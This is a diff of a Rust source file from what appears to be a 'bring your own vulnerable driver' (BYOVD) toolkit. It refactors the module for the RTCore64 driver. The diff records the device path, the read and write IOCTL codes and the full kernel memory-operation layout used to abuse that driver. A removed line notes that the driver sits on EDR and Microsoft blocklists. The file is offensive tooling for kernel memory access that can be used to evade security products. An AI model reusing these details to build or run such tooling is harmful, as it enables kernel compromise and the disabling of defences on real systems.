@@ -6,25 +6,12 @@
 //! Device: `\\.\RTCore64`
 //! Read:  0x80002048
 //! Write: 0x8000204C
-//! Layout: 48-byte MemoryOperation, address at offset 0x08.
+//! Layout: 48-byte MemoryOperation, address at offset 0x08, size @ 0x18,
+//!         data @ 0x1C. One byte per IOCTL (looped for multi-byte transfers).
+//!
+//! This is the REFERENCE driver: its protocol is the trait default
+//! ([`crate::byovd::VulnDriverIoctl::raw_rw`]). The real implementation lives in
+//! [`crate::byovd::RtCore64`]; this module re-exports it so the
+//! `byovd_drivers::rtc64::RtCore64` path keeps working (one source of truth).
 
-use crate::byovd::VulnDriverIoctl;
-
-pub struct RtCore64;
-
-impl VulnDriverIoctl for RtCore64 {
-    fn device_path(&self) -> &[u16] {
-        static PATH: [u16; 12] = [
-            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
-            'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16,
-            'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
-        ];
-        &PATH
-    }
-    fn read_ioctl(&self) -> u32 { 0x80002048 }
-    fn write_ioctl(&self) -> u32 { 0x8000204C }
-    fn addr_offset(&self) -> usize { 0x08 }
-    fn blocklist_status(&self) -> &'static str {
-        "BLOCKLISTED: on all major EDR + Microsoft Vulnerable Driver Blocklist since 2020"
-    }
-}
+pub use crate::byovd::RtCore64;
